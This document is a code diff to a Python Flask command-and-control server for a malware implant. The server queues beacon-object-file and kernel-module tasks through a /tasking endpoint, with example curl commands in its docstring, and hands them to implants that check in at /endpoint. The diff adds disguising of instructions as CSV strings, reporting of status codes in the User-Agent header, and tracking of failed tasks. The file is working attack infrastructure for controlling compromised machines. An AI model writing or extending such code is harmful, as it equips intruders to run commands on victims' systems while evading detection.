@@ -8,18 +8,20 @@ from struct import pack, calcsize
 from collections import deque
 import secrets
 
-app = Flask(__name__)
-
-bofsRootDir = "/bofs/"
-kmodsRootDir = "/kmods/"
-
 """
-Structure of tasks (running simple BOF):
-cmdData0 = {
-	"header" : "inline:z",
-	"name" : "bof:uname",
-	"argv" : "-r",
-};
+Tasking an implant to execute 'uname' BOF with '-r' arguemnt provided:
+curl -H 'Content-Type: application/json' http://127.0.0.1:8000/tasking -d '{
+ "header" : "inline:z",
+ "name" : "bof:uname",
+ "argv" : "-r"
+}'
+
+Tasking an implant to execute 'uname' BOF with '-a' arguemnt and do not unload it after execution ('persist'):
+curl -H 'Content-Type: application/json' http://127.0.0.1:8000/tasking -d '{
+ "header" : "inline:z:persist",
+ "name" : "bof:uname",
+ "argv" : "-a"
+}'
 
 Structure of tasks (running BOF and passing the buffer content to it):
 cmdData1 = {
@@ -57,15 +59,34 @@ cmdData4 = {
 };
 """
 
+app = Flask(__name__)
+
+CHECKIN_IMPLANT_IDENTITY_HEADER = "Authorization"
+
+OUTPUT_RESULT_TASKID_HEADER =  "Authorization"
+
+OUTPUT_RESULT_STATUS_CODE_HEADER =  "User-Agent"
+def parseStatusCode(status_code):
+    print("Status code: " + status_code)
+    _, sc = status_code.split(':')
+    return sc
+
+bofsRootDir = "/bofs/"
+kmodsRootDir = "/kmods/"
+
 # Fifo queue of tasks to execute by implant
 # POST request to /tasking endpoint adds (appendLeft) a new task to it
 # GET request to /endpoint endpoint pops a task (if available) from it and starts processing it
 TaskFifo = deque()
 
-# Repositories of tasks' input data (sent from operator) and tasks' output data (sent back from implant)
-# stored under reqID keys 
+# Repositories of:
+# 1. tasks' input data (sent from operator)
+# 2. tasks' output data (sent back from implant) that were successful
+# 3. tasks' that failed (returned error code)
+# stored under taskID keys 
 InputDict = dict()
 OutputDict = dict()
+ErrorDict = dict()
 
 @app.route("/")
 def main_page():
@@ -76,13 +97,18 @@ def addTask():
 
     if request.method == 'POST' and request.is_json:
         reqData = request.get_json()
-        # add unique ID to the task
+
+        # add unique ID to the task (taskID)
         reqData['id'] = secrets.token_hex()
-        # convert JSON request to string and append it to task FIFO
+
+        # check if all required fields are present
+        if not 'name' in reqData or not 'header' in reqData:
+            return "<p>Badly formatted taskt!</p>"
+
+        # convert JSON request to string and append it to TaskFifo 
         data = json.dumps(reqData)
         TaskFifo.appendleft(data) 
         return "<p>Consumed</p>"
-
 
     # handle GET:
     resp = []
@@ -91,38 +117,36 @@ def addTask():
     for task in TaskFifo:
         resp.append(task + '<br/>')
 
-    resp.append("<p>Tasks history:</p>")
+    resp.append("<p>Completed tasks:</p>")
 
     for key, value in InputDict.items():
         if key in OutputDict:
-            resp.append(value + '<br/>')
-            resp.append(OutputDict[key].decode('utf-8') + '<br/><br/>')
+            resp.append('----------------------------------<br/>')
+            resp.append('Task ID: ' + key + '<br/>')
+            resp.append('Task raw input:<br/>')
+            resp.append(value + '<br/><br/>')
+            resp.append('Task output:<br/>')
+            resp.append(OutputDict[key].decode('utf-8') + '<br/>')
+            resp.append('<br/>----------------------------------<br/><br/>')
+
+    resp.append("<p>Failed tasks:</p>")
+
+    for key, value in InputDict.items():
+        if key in ErrorDict:
+            resp.append('----------------------------------<br/>')
+            resp.append('Task ID: ' + key + '<br/>')
+            resp.append('Task raw input:<br/>')
+            resp.append(value + '<br/><br/>')
+            resp.append('Task status code: ' + str(ErrorDict[key]) + '<br/>')
+            resp.append('<br/>----------------------------------<br/><br/>')
+
     
     str_out = ''.join(resp)
     return str_out
 
-# GET /endpoint - check if task is available
-# POST /endpoint - send in task's output data
-@app.route("/endpoint", methods=['GET', 'POST'])
-def heartbeat():
+def constructJSONInstruction(implant_identity):
 
-    # get implant's output data and add it to the output's store under 'reqID' key
-    if request.method == 'POST':
-        reqID = request.headers.get('Authorization')
-        data = base64.b64decode(request.get_data())
-        OutputDict[reqID] = data
-        return ""
-
-    # abort, if there are no tasks to process
-    if len(TaskFifo) == 0:
-        return "nothing to do"
-
-    # get implant's identification data encoded in 'Authorization' header
-    authz = base64.b64decode(request.headers.get('Authorization')).decode('utf-8')
-    if not authz:
-        return "go away"
-
-    arch, os = authz.split(':')
+    arch, os = implant_identity.split(':')
     if arch == "x86_64":
         arch = "x64"
     if os == "windows":
@@ -134,19 +158,15 @@ def heartbeat():
     data = TaskFifo.pop()
     cmdData = json.loads(data) # deserialize to JSON
 
-    # check for required fields (name, header, id)
-    if cmdData['name'] == "" or cmdData['header'] == "" or cmdData['id'] == "":
-        return "say what?"
-
     # request ID for identifying requests (task input data) with responses (tasks output)
-    reqID = cmdData['id']
+    taskID = cmdData['id']
 
     # store task's input data for logging purposes
-    InputDict[reqID] = data
+    InputDict[taskID] = data
 
     # Based on task's input data (cmdData), prepare an implant's instruction (Instruction) for execution 
     Instruction = {
-        "id": reqID,
+        "id": taskID,
         "name": cmdData['name'],
     }
 
@@ -194,7 +214,7 @@ def heartbeat():
     # get args specification possible values: iszZb
     args_spec = header.split(':')[1]
 
-    # skip further processing with no arguments were provided
+    # skip further processing if no arguments were provided
     if args_spec == "":
         return Instruction 
 
@@ -253,7 +273,52 @@ def heartbeat():
     Instruction['argv'] = base64.b64encode(new_argv.encode('utf-8')).decode('utf-8')
 
     # return Implant's Instruction for execution
-    return Instruction 
+    return Instruction
+
+def masqueradeInstruction(Instruction):
+    csvString = ""
+    for key, value in Instruction.items():
+        #if key == "header": 
+        #    value = value.replace(':', ',')
+
+        csvString += value + ','
+
+    print(csvString)
+
+    return csvString
+
+# GET /endpoint - check if task is available
+# POST /endpoint - send in task's output data
+@app.route("/endpoint", methods=['GET', 'POST'])
+def heartbeat():
+
+    # get implant's output data and add it to the output's store under 'taskID' key
+    if request.method == 'POST':
+        task_status_hdr = request.headers.get(OUTPUT_RESULT_STATUS_CODE_HEADER)
+        status_code = int(parseStatusCode(task_status_hdr))
+        taskID = request.headers.get(OUTPUT_RESULT_TASKID_HEADER)
+
+        if status_code == 0:
+            data = base64.b64decode(request.get_data())
+            OutputDict[taskID] = data
+        else:
+            ErrorDict[taskID] = status_code
+        return ""
+
+    # abort, if there are no tasks to process
+    if len(TaskFifo) == 0:
+        return "nothing to do"
+
+    # get implant's identification data encoded from (previously agreed) header
+    implant_identity = base64.b64decode(request.headers.get(CHECKIN_IMPLANT_IDENTITY_HEADER)).decode('utf-8')
+    if not implant_identity:
+        return "go away"
+
+    implantInstruction = constructJSONInstruction(implant_identity)
+
+    return masqueradeInstruction(implantInstruction)
+
+
 
 @app.route(bofsRootDir + '<path:path>')
 def send_report(path):
